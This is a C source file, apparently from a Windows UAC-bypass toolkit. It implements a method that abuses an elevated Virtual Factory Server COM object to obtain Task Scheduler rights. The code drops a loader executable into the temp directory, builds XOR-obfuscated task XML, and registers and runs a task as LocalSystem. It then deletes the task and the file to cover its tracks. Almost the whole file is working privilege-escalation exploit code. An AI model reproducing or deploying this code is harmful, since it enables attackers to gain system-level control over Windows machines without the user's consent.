/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2022
*
*  TITLE:       ZCGONVH.C
*
*  VERSION:     3.61
*
*  DATE:        22 Jun 2022
*
*  UAC bypass methods from zcgonvh.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "encresource.h"

BOOL ucmxGetElevatedFactoryServerAndTaskService(
    _Out_ IElevatedFactoryServer** FactoryServer,
    _Out_ ITaskService** TaskService
)
{
    IElevatedFactoryServer* pElevatedServer = NULL;
    ITaskService* pService = NULL;
    HRESULT r;

    *TaskService = NULL;
    *FactoryServer = NULL;

    do {
        r = ucmAllocateElevatedObject(T_CLSID_VirtualFactoryServer,
            &IID_ElevatedFactoryServer,
            CLSCTX_LOCAL_SERVER,
            (VOID**)&pElevatedServer);

        if (r != S_OK)
            break;

        if (pElevatedServer == NULL) {
            r = E_OUTOFMEMORY;
            break;
        }

        r = pElevatedServer->lpVtbl->ServerCreateElevatedObject(pElevatedServer,
            &CLSID_TaskScheduler,
            &IID_ITaskService,
            (void**)&pService);

        if (r != S_OK)
            break;

        if (pService == NULL) {
            r = E_OUTOFMEMORY;
            break;
        }

        *FactoryServer = pElevatedServer;
        *TaskService = pService;

    } while (FALSE);

    return SUCCEEDED(r);
}

BOOL ucmxRegisterAndRunTask(
    _In_ ITaskService* TaskService,
    _In_ BSTR RegistrationData
)
{
    HRESULT r = E_FAIL;
    VARIANT varDummy;

    ITaskFolder* pTaskFolder = NULL;
    IRegisteredTask* pTask = NULL;
    IRunningTask* pRunningTask = NULL;

    TASK_STATE taskState = TASK_STATE_UNKNOWN;

    BSTR bstrTaskFolder = NULL, bstrTaskName = NULL;

    do {

        bstrTaskFolder = SysAllocString(L"\\");
        if (bstrTaskFolder == NULL)
            break;

        bstrTaskName = SysAllocString(THEOLDNEWTHING);
        if (bstrTaskName == NULL)
            break;

        VariantInit(&varDummy);

        r = TaskService->lpVtbl->Connect(TaskService,
            varDummy,
            varDummy,
            varDummy,
            varDummy);

        if (FAILED(r))
            break;

        r = TaskService->lpVtbl->GetFolder(TaskService, bstrTaskFolder, &pTaskFolder);
        if (r != S_OK || pTaskFolder == NULL)
            break;

        r = pTaskFolder->lpVtbl->RegisterTask(pTaskFolder, bstrTaskName, RegistrationData, 0,
            varDummy, varDummy, TASK_LOGON_INTERACTIVE_TOKEN, varDummy, &pTask);

        if (r == HRESULT_FROM_WIN32(ERROR_ALREADY_EXISTS)) {

            r = pTaskFolder->lpVtbl->GetTask(pTaskFolder, bstrTaskName, &pTask);
            if (SUCCEEDED(r)) {

                pTask->lpVtbl->Stop(pTask, 0);
                pTask->lpVtbl->Release(pTask);

                pTaskFolder->lpVtbl->DeleteTask(pTaskFolder, bstrTaskName, 0);
            }

            r = pTaskFolder->lpVtbl->RegisterTask(pTaskFolder, bstrTaskName, RegistrationData, 0,
                varDummy, varDummy, TASK_LOGON_INTERACTIVE_TOKEN, varDummy, &pTask);
        }

        if (r != S_OK || pTask == NULL)
            break;

        r = pTask->lpVtbl->Run(pTask, varDummy, &pRunningTask);

        if (r != S_OK || pRunningTask == NULL)
            break;

        if (SUCCEEDED(pRunningTask->lpVtbl->get_State(pRunningTask, &taskState))) {

            if (taskState == TASK_STATE_RUNNING) {
                Sleep(5000);
            }

        }
        pRunningTask->lpVtbl->Stop(pRunningTask);
        pTaskFolder->lpVtbl->DeleteTask(pTaskFolder, bstrTaskName, 0);

    } while (FALSE);

    if (bstrTaskFolder)
        SysFreeString(bstrTaskFolder);

    if (bstrTaskName)
        SysFreeString(bstrTaskName);

    if (pRunningTask)
        pRunningTask->lpVtbl->Release(pRunningTask);

    if (pTask)
        pTask->lpVtbl->Release(pTask);

    if (pTaskFolder)
        pTaskFolder->lpVtbl->Release(pTaskFolder);

    return SUCCEEDED(r);
}

BSTR ucmxBuildParametersForTask(
    _In_ LPCWSTR lpLoader,
    _In_ SIZE_T cbLoader
)
{
    BSTR bstrResult = NULL;
    SIZE_T sz;
    PVOID workBuffer, offsetPtr;

    sz = cbLoader +
        sizeof(g_encodedTaskParamBegin) +
        sizeof(g_encodedTaskParamEnd);

    workBuffer = (PWCH)supHeapAlloc(sz);
    if (workBuffer) {

        offsetPtr = workBuffer;
        RtlCopyMemory(offsetPtr, g_encodedTaskParamBegin, sizeof(g_encodedTaskParamBegin));
        EncodeBuffer(offsetPtr, sizeof(g_encodedTaskParamBegin), AKAGI_XOR_KEY2);
        offsetPtr = RtlOffsetToPointer(offsetPtr, sizeof(g_encodedTaskParamBegin));

        RtlCopyMemory(offsetPtr, lpLoader, cbLoader);
        offsetPtr = RtlOffsetToPointer(offsetPtr, cbLoader);

        RtlCopyMemory(offsetPtr, g_encodedTaskParamEnd, sizeof(g_encodedTaskParamEnd));
        EncodeBuffer(offsetPtr, sizeof(g_encodedTaskParamEnd), AKAGI_XOR_KEY2);

        bstrResult = SysAllocString(workBuffer);

        supHeapFree(workBuffer);
    }

    return bstrResult;
}

/*
* ucmVirtualFactoryServer
*
* Purpose:
*
* Bypass UAC by using Elevated Factory Server COM object.
*
* 1. Allocate Elevated Factory Server COM object and produce with it help Task Scheduler object.
* 2. Use Task Scheduler object to register task running as LocalSystem.
*
*/
NTSTATUS ucmVirtualFactoryServer(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    BOOL bNeedCleanup = FALSE;
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    HRESULT hr_init;
    IElevatedFactoryServer* pElevatedServer = NULL;
    ITaskService* pTaskService = NULL;
    BSTR bstrXml = NULL;
    WCHAR szLoaderFileName[MAX_PATH * 2];

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    do {

        //
        // Write loader to the %temp%
        //
        if (!supReplaceDllEntryPoint(
            ProxyDll,
            ProxyDllSize,
            AKATSUKI_ENTRYPOINT_EXE,
            TRUE))
        {
            break;
        }
        RtlSecureZeroMemory(&szLoaderFileName, sizeof(szLoaderFileName));
        _strcpy(szLoaderFileName, g_ctx->szTempDirectory);
        _strcat(szLoaderFileName, THEOLDNEWTHING);
        _strcat(szLoaderFileName, TEXT(".exe"));

        bNeedCleanup = supWriteBufferToFile(szLoaderFileName, ProxyDll, ProxyDllSize);
        if (!bNeedCleanup)
            break;

        bstrXml = ucmxBuildParametersForTask(szLoaderFileName, _strlen(szLoaderFileName) * sizeof(WCHAR));
        if (bstrXml == NULL)
            break;

        if (!ucmxGetElevatedFactoryServerAndTaskService(&pElevatedServer, &pTaskService))
            break;

        if (ucmxRegisterAndRunTask(pTaskService, bstrXml))
            MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    if (bstrXml)
        SysFreeString(bstrXml);

    if (pElevatedServer != NULL) {
        pElevatedServer->lpVtbl->Release(pElevatedServer);
    }

    if (SUCCEEDED(hr_init))
        CoUninitialize();

    if (bNeedCleanup)
        DeleteFile(szLoaderFileName);

    return MethodResult;
}
